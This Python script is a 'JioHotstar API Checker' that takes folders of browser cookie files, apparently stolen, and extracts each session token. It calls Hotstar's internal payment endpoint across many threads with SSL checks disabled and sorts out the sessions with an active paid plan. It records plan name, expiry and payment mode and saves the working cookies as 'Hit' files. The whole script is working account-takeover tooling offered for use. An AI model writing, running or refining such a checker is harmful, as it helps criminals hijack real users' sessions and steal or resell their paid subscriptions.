import requests
import os
import re
import json
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import urllib3

# Disable SSL warnings for cleaner output
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

USERNAME = "@SkillIssueXD"
DEBUG_MODE = False

def check_geo_location():
    """Check if running from India (required for Hotstar API)"""
    try:
        resp = requests.get('https://ipapi.co/json/', timeout=5)
        data = resp.json()
        country = data.get('country_code', 'Unknown')
        city = data.get('city', 'Unknown')
        ip = data.get('ip', 'Unknown')
        
        if country != 'IN':
            print(f"\n⚠️  WARNING: You are running from {city}, {data.get('country_name', country)}")
            print(f"   IP: {ip}")
            print(f"   Hotstar API requires Indian IP address!")
            print(f"   Use a VPN connected to India for this script to work.\n")
            return False
        else:
            print(f"\n✅ Location: {city}, India ({ip})")
            return True
    except Exception:
        print("\n⚠️  Could not verify location. Script may fail if not in India.")
        return True  # Continue anyway

def load_cookies_from_netscape_file(cookie_file):
    cookies = {}
    try:
        with open(cookie_file, 'r', encoding='utf-8') as file:
            for line in file:
                if not line.startswith('#') and line.strip():
                    parts = line.strip().split('\t')
                    if len(parts) >= 7:
                        cookies[parts[5]] = parts[6].strip('"')
    except Exception:
        pass
    return cookies

def check_hotstar_api(cookies, cookie_file, result_dict, lock, working_folder, file_counter, new_files):
    # --- NEW ENDPOINT: Payment Details ---
    # This endpoint provides Plan Name, Payment Mode (UPI/Jio), and specific Date Ranges.
    url = "https://www.hotstar.com/api/internal/bff/v2/slugs/in/payment/details"
    
    # Extract Auth Token
    user_token = cookies.get("userUP")
    if not user_token:
        for k, v in cookies.items():
            if k.lower() == "userup":
                user_token = v
                break
    
    if not user_token:
        with lock: result_dict['total'] += 1; result_dict['invalid'] += 1
        return 0

    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "eng",
        "baggage": "sentry-environment=prod,sentry-release=26.01.02.0-2026-01-02T07%3A51%3A01",
        "referer": "https://www.hotstar.com/in/payment/details",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
        "x-country-code": "in",
        "x-hs-app": "260102000",
        "x-hs-platform": "web",
        "x-hs-usertoken": user_token,
    }

    try:
        response = requests.get(url, headers=headers, cookies=cookies, timeout=15, verify=False)
        
        if response.status_code != 200:
            with lock: result_dict['total'] += 1; result_dict['invalid'] += 1
            if DEBUG_MODE:
                print(f"[-] {os.path.basename(cookie_file)} -> HTTP {response.status_code}")
            return 0

        # Check if response is JSON (API) or HTML (auth failed/redirected)
        content_type = response.headers.get('content-type', '')
        if 'application/json' not in content_type:
            with lock: result_dict['total'] += 1; result_dict['invalid'] += 1
            print(f"[-] {os.path.basename(cookie_file)[:50]}... -> Session Expired/Invalid")
            return 0

        data = response.json()
        
        # --- PARSING LOGIC FOR PAYMENT & EXPIRY ---
        plan_status = "NO❌"
        details_str = ""
        plan_price = ""
        
        try:
            # Navigate to the Table Widget
            spaces = data.get('success', {}).get('page', {}).get('spaces', {})
            content = spaces.get('content', {})
            widgets = content.get('widget_wrappers', [])
            
            rows = []
            for w in widgets:
                if w.get('template') == 'PaymentHistoryTableWidget':
                    rows = w.get('widget', {}).get('data', {}).get('rows', [])
                    break
            
            if rows:
                # The first group of rows usually represents the latest transaction
                # Row 0: Plan Name + Dates
                # Row 1: Amount + Payment Mode
                
                latest_plan_row = rows[0]
                payment_mode_row = rows[1] if len(rows) > 1 else {}
                
                # 1. Get Plan Name
                title_list = latest_plan_row.get('title', [])
                if title_list:
                    plan_name = title_list[0]
                    
                    # 2. Get Expiry & Date Range
                    desc_list = latest_plan_row.get('desc', [])
                    date_range = desc_list[0] if desc_list else "Unknown Dates"
                    
                    # 3. Get Payment Mode (e.g., "Via Upi", "Via JIO")
                    pay_desc_list = payment_mode_row.get('desc', [])
                    payment_mode = pay_desc_list[0] if pay_desc_list else "Unknown Payment"
                    
                    # 3b. Get Plan Price (from second row title)
                    pay_title_list = payment_mode_row.get('title', [])
                    plan_price = pay_title_list[0] if pay_title_list else "Unknown Price"
                        
                    # 4. Check Validity (Is it Active?)
                    is_active = False
                    end_date_str = None
                    try:
                        # Format: "12 Jan, 2026 to 12 Apr, 2026"
                        if " to " in date_range:
                            start_date_str = date_range.split(" to ")[0].strip()
                            end_date_str = date_range.split(" to ")[1].strip()
                            expiry_dt = datetime.strptime(end_date_str, "%d %b, %Y")
                            if expiry_dt >= datetime.now():
                                is_active = True
                                details_str = f"Plan: {plan_name}\nExpiry: {end_date_str}\nPayment: {payment_mode}\nPrice: {plan_price}\nStart: {start_date_str}"
                            else:
                                details_str = f"EXPIRED: {plan_name} (Expired on {end_date_str})\nPrice: {plan_price}\nPayment: {payment_mode}"
                        else:
                            # No date range found - assume active (could be new format)
                            is_active = True
                            details_str = f"Plan: {plan_name}\nRange: {date_range}\nPayment: {payment_mode}\nPrice: {plan_price}"
                    except Exception:
                        # If date parsing fails, assume active if it's the top row, but mark as check needed
                        is_active = True 
                        details_str = f"Plan: {plan_name}\nRange: {date_range}\nPayment: {payment_mode}\nPrice: {plan_price}"

                    if is_active:
                        plan_status = f"{plan_name}✅"
                    else:
                        plan_status = "Expired❌"

        except Exception:
            pass
            
        # Fallback: If no history found but page loaded, might be a fresh/free account
        if plan_status == "NO❌":
            if data.get('success', {}).get('page', {}).get('id') == 'payment':
                 plan_status = "Free/No History✅"

        # --- SAVE RESULT ---
        with lock:
            result_dict['total'] += 1
            if "✅" in plan_status and "Free" not in plan_status:
                result_dict['valid'] += 1
                
                # Console Output with Details
                print(f"[+] {os.path.basename(cookie_file)}")
                print(f"    └─ {plan_status}")
                if details_str:
                    lines = details_str.splitlines()
                    if len(lines) >= 4:
                        exp_info = lines[1].replace('Expiry: ', '').replace('Range: ', '')
                        pay_info = lines[2].replace('Payment: ', '')
                        price_info = lines[3].replace('Price: ', '')
                        print(f"    └─ Expires: {exp_info} | {pay_info} | {price_info}")
                    elif len(lines) >= 3:
                        exp_info = lines[1].replace('Expiry: ', '').replace('Range: ', '')
                        pay_info = lines[2]
                        print(f"    └─ Expires: {exp_info} | {pay_info}")
                    else:
                        print(f"    └─ {details_str.replace(chr(10), ' | ')}")

                os.makedirs(working_folder, exist_ok=True)
                clean_plan = re.sub(r'[<>:"/\\|?*]', '', plan_status.replace("✅", "").strip())
                out_file = os.path.join(working_folder, f"[{clean_plan}]-Hit_{file_counter}.txt")
                
                with open(out_file, "w", encoding="utf-8") as f:
                    with open(cookie_file, "r", encoding="utf-8") as orig:
                        f.write(orig.read())
                    f.write(f"\n\n{'-'*30}\nCAPTURE RESULTS ({datetime.now()})\n{'-'*30}\n")
                    f.write(f"{details_str}\n")
                    f.write(f"URL: {url}\n")
                new_files.append(out_file)
            else:
                result_dict['invalid'] += 1
                print(f"[-] {os.path.basename(cookie_file)} -> {plan_status}")

        return 1

    except requests.exceptions.Timeout:
        print(f"[!] {os.path.basename(cookie_file)[:40]}... -> Timeout")
        with lock: result_dict['total'] += 1; result_dict['invalid'] += 1
        return 0
    except requests.exceptions.ConnectionError:
        print(f"[!] {os.path.basename(cookie_file)[:40]}... -> Connection Error")
        with lock: result_dict['total'] += 1; result_dict['invalid'] += 1
        return 0
    except Exception as e:
        if DEBUG_MODE:
            print(f"[!] Error on {os.path.basename(cookie_file)[:40]}: {e}")
        with lock: result_dict['total'] += 1; result_dict['invalid'] += 1
        return 0

def process_folder(input_folder, result_dict, thread_count, new_files):
    if not os.path.isdir(input_folder):
        print("Invalid folder.")
        return

    txt_files = [os.path.join(input_folder, f) for f in os.listdir(input_folder) if f.lower().endswith(".txt")]
    print(f"Found {len(txt_files)} files to check...\n")
    
    working_folder = "JioHotstar Cookies Hit"
    file_counter = 1
    lock = threading.Lock()
    
    with ThreadPoolExecutor(max_workers=thread_count) as executor:
        futures = []
        for i, txt_file in enumerate(txt_files):
            cookies = load_cookies_from_netscape_file(txt_file)
            if cookies:
                futures.append(executor.submit(check_hotstar_api, cookies, txt_file, result_dict, lock, working_folder, file_counter + i, new_files))
        
        for future in as_completed(futures):
            try: future.result()
            except: pass

def main():
    print("=" * 60 + "\n   JioHotstar API Checker v3.3 - Payment & Expiry\n" + "=" * 60)
    
    # Check geo-location first
    is_india = check_geo_location()
    if not is_india:
        proceed = input("Continue anyway? (y/n): ").strip().lower()
        if proceed != 'y':
            print("Exiting. Please connect to an Indian VPN and try again.")
            return
    
    input_folder = input("\nEnter Folder Path: ").strip().strip('"\'')
    try:
        thread_count = int(input("Threads (default 10): ").strip() or 10)
    except:
        thread_count = 10
    
    result_dict = {'total': 0, 'valid': 0, 'invalid': 0}
    new_files = []
    
    print(f"\nStarting API Check on {input_folder}...\n")
    process_folder(input_folder, result_dict, thread_count, new_files)
    
    print(f"\n{'='*60}")
    print(f"   RESULTS SUMMARY")
    print(f"{'='*60}")
    print(f"   Total Checked: {result_dict['total']}")
    print(f"   Valid/Active:  {result_dict['valid']}")
    print(f"   Invalid/Expired: {result_dict['invalid']}")
    if result_dict['valid'] > 0:
        print(f"   Saved to: JioHotstar Cookies Hit/")
    print(f"{'='*60}")

if __name__ == "__main__":
    main()